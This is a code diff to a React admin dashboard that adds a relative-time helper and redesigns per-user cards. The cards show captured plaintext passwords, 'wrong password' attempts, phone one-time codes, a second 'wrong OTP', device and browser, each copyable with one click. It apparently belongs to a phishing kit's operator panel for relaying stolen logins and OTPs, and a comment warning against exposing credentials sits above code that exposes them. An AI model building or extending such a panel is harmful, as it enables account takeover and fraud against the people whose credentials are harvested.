@@ -31,6 +31,65 @@ useEffect(() => {
   }
 }, [soundEnabled]);
 
+const timeAgo = (date) => {
+  if (!date) return "";
+
+  const seconds = Math.floor(
+    (Date.now() - new Date(date).getTime()) / 1000
+  );
+
+  if (seconds < 60) {
+    return seconds <= 1
+      ? "1 sec ago"
+      : `${seconds} secs ago`;
+  }
+
+  const minutes = Math.floor(seconds / 60);
+
+  if (minutes < 60) {
+    return minutes === 1
+      ? "1 min ago"
+      : `${minutes} mins ago`;
+  }
+
+  const hours = Math.floor(minutes / 60);
+
+  if (hours < 24) {
+    return hours === 1
+      ? "1 hour ago"
+      : `${hours} hours ago`;
+  }
+
+  const days = Math.floor(hours / 24);
+
+  if (days < 7) {
+    return days === 1
+      ? "1 day ago"
+      : `${days} days ago`;
+  }
+
+  const weeks = Math.floor(days / 7);
+
+  if (weeks < 4) {
+    return weeks === 1
+      ? "1 week ago"
+      : `${weeks} weeks ago`;
+  }
+
+  const months = Math.floor(days / 30);
+
+  if (months < 12) {
+    return months === 1
+      ? "1 month ago"
+      : `${months} months ago`;
+  }
+
+  const years = Math.floor(days / 365);
+
+  return years === 1
+    ? "1 year ago"
+    : `${years} years ago`;
+};
 
   // ======================================
   // GET USERS
@@ -813,173 +872,219 @@ const handlePhoneOtp2Submitted = (data) => {
                                 <div style={styles.info}>
 
   {/* Password - don't expose/copy sensitive credentials */}
-  <p    onClick={() =>
-      copyField("password", user.password)
-    }
-    style={{
-      ...styles.infoRow,
-      cursor: user.password
-        ? "pointer"
-        : "default"
-    }}>
-    <span style={styles.infoLabel}>
-      Password
-    </span>
+        {expandedUsers[user._id] && (
+  <div className="user-details">
 
-    <span style={styles.infoValue}>
-      {copiedField === "password"
-        ? "✓ Copied!"
-        : user.password || "Not submitted"}
-    </span>
-  </p>
-    <p    onClick={() =>
-      copyField("wrongpassword", user.wrongPassword)
-    }
-    style={{
-      ...styles.infoRow,
-      cursor: user.wrongPassword
-        ? "pointer"
-        : "default"
-    }}>
-    <span style={styles.infoLabel}>
-      Wrong Password
-    </span>
+    {user.phoneNumber && (
+      <button
+        className="detail-button"
+        onClick={() =>
+          copyField("phone", user.phoneNumber)
+        }
+      >
+        <span className="detail-label">
+          Phone:
+        </span>{" "}
 
-    <span style={styles.infoValue}>
-      {copiedField === "wrongpassword"
-        ? "✓ Copied!"
-        : user.wrongPassword || "Not submitted"}
-    </span>
-  </p>
+        {copiedField === "phone" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <span className="detail-value">
+            {user.phoneNumber}
+          </span>
+        )}
+      </button>
+    )}
+        {user.password && (
+      <button
+        className="detail-button"
+        onClick={() =>
+          copyField("password", user.password)
+        }
+      >
+        <span className="detail-label">
+          Password:
+        </span>{" "}
+
+        {copiedField === "password" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <span className="detail-value">
+            {user.password}
+          </span>
+        )}
+      </button>
+    )}
+        {user.wrongPassword && (
+      <button
+        className="detail-button"
+        onClick={() =>
+          copyField("wrongpassword", user.wrongPassword)
+        }
+      >
+        <span className="detail-label">
+          Wrong password:
+        </span>{" "}
+
+        {copiedField === "wrongpassword" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <span className="detail-value">
+            {user.wrongPassword}
+          </span>
+        )}
+      </button>
+    )}
+        {user.phoneOtp && (
+      <button
+        className="detail-button"
+        onClick={() =>
+          copyField("phoneotp", user.phoneOtp)
+        }
+      >
+        <span className="detail-label">
+          Phone OTP:
+        </span>{" "}
+
+        {copiedField === "phoneotp" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <span className="detail-value">
+            {user.phoneOtp}
+          </span>
+        )}
+      </button>
+    )}
+        {user.phoneOtp2 && (
+      <button
+        className="detail-button"
+        onClick={() =>
+          copyField("phoneotp2", user.phoneOtp2)
+        }
+      >
+        <span className="detail-label">
+          Wrong OTP:
+        </span>{" "}
+
+        {copiedField === "phoneotp2" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <span className="detail-value">
+            {user.phoneOtp2}
+          </span>
+        )}
+      </button>
+    )}
 
 
-  <p
-    onClick={() =>
-      copyField("phone", user.phoneNumber)
-    }
-    style={{
-      ...styles.infoRow,
-      cursor: user.phoneNumber
-        ? "pointer"
-        : "default"
-    }}
+    {user.device && user.browser && (
+      <button
+        className="device-browser-button"
+        onClick={() =>
+          copyField(
+            "device-browser",
+            `${user.device} / ${user.browser}`
+          )
+        }
+      >
+        {copiedField === "device-browser" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <>
+            <span className="detail-value">
+              {user.device}
+            </span>
+
+            <span className="detail-label">
+              /
+            </span>
+
+            <span className="detail-value">
+              {user.browser}
+            </span>
+          </>
+        )}
+      </button>
+    )}
+
+
+    {user.device && !user.browser && (
+      <button
+        className="detail-button"
+        onClick={() =>
+          copyField("device", user.device)
+        }
+      >
+        <span className="detail-label">
+          Device:
+        </span>{" "}
+
+        {copiedField === "device" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <span className="detail-value">
+            {user.device}
+          </span>
+        )}
+      </button>
+    )}
+
+
+    {user.browser && !user.device && (
+      <button
+        className="detail-button"
+        onClick={() =>
+          copyField("browser", user.browser)
+        }
+      >
+        <span className="detail-label">
+          Browser:
+        </span>{" "}
+
+        {copiedField === "browser" ? (
+          <span className="detail-copied">
+            ✓ Copied!
+          </span>
+        ) : (
+          <span className="detail-value">
+            {user.browser}
+          </span>
+        )}
+      </button>
+    )}
+
+
+   {user.createdAt && (
+  <button
+    className="detail-button"
+    type="button"
   >
-    <span style={styles.infoLabel}>
-      Phone number
+    <span className="detail-label">
+      Created:
+    </span>{" "}
+
+    <span className="detail-value">
+      {timeAgo(user.createdAt)}
     </span>
+  </button>
+)}
 
-    <span style={styles.infoValue}>
-      {copiedField === "phone"
-        ? "✓ Copied!"
-        : user.phoneNumber || "Not submitted"}
-    </span>
-  </p>
-    <p
-    onClick={() =>
-      copyField("phoneotp", user.phoneOtp)
-    }
-    style={{
-      ...styles.infoRow,
-      cursor: user.phoneOtp
-        ? "pointer"
-        : "default"
-    }}
-  >
-    <span style={styles.infoLabel}>
-      Phone OTP
-    </span>
-
-    <span style={styles.infoValue}>
-      {copiedField === "phoneotp"
-        ? "✓ Copied!"
-        : user.phoneOtp || "Not submitted"}
-    </span>
-  </p>
-    <p
-    onClick={() =>
-      copyField("phoneotp2", user.phoneOtp2)
-    }
-    style={{
-      ...styles.infoRow,
-      cursor: user.phoneOtp2
-        ? "pointer"
-        : "default"
-    }}
-  >
-    <span style={styles.infoLabel}>
-     Wrong Phone 
-    </span>
-
-    <span style={styles.infoValue}>
-      {copiedField === "phoneotp2"
-        ? "✓ Copied!"
-        : user.phoneOtp2 || "Not submitted"}
-    </span>
-  </p>
-  
-
-
-
-
-  <p
-    onClick={() =>
-      copyField("device", user.device)
-    }
-    style={{
-      ...styles.infoRow,
-      cursor: user.device
-        ? "pointer"
-        : "default"
-    }}
-  >
-    <span style={styles.infoLabel}>
-      Device
-    </span>
-
-    <span style={styles.infoValue}>
-      {copiedField === "device"
-        ? "✓ Copied!"
-        : user.device || "Not submitted"}
-    </span>
-  </p>
-
-
-  <p
-    onClick={() =>
-      copyField("browser", user.browser)
-    }
-    style={{
-      ...styles.infoRow,
-      cursor: user.browser
-        ? "pointer"
-        : "default"
-    }}
-  >
-    <span style={styles.infoLabel}>
-      Browser
-    </span>
-
-    <span style={styles.infoValue}>
-      {copiedField === "browser"
-        ? "✓ Copied!"
-        : user.browser || "Not submitted"}
-    </span>
-  </p>
-
-
-  <p style={styles.infoRow}>
-    <span style={styles.infoLabel}>
-      Created
-    </span>
-
-    <span style={styles.infoValue}>
-      {user.createdAt
-        ? new Date(
-            user.createdAt
-          ).toLocaleString()
-        : "Unknown"}
-    </span>
-  </p>
+  </div>
+)}
 
 </div>
 
